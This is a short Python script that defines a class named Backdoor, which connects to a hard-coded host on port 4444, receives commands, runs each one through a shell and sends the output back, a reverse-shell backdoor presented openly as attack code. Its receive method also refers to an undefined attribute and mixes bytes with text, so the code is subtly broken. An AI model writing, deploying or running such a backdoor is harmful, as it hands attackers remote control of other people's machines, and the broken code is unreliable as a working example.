import socket
import subprocess
import json

class Backdoor:
    def __init__(self, ip, port):
        self.sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock_obj.connect((ip, port))

    def exec_system_cmd(self, command):
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        json_data = json.dumps(data.decode('utf-8'))
        self.sock_obj.send(json_data.encode('utf-8'))
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.client_obj.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except:
                continue



    def run(self):
        while True:
            recv_data = self.reliable_receive()
            res = self.exec_system_cmd(recv_data)
            self.reliable_send(res)

        self.sock_obj.close()

backdoor = Backdoor("192.168.1.39",4444)
backdoor.run()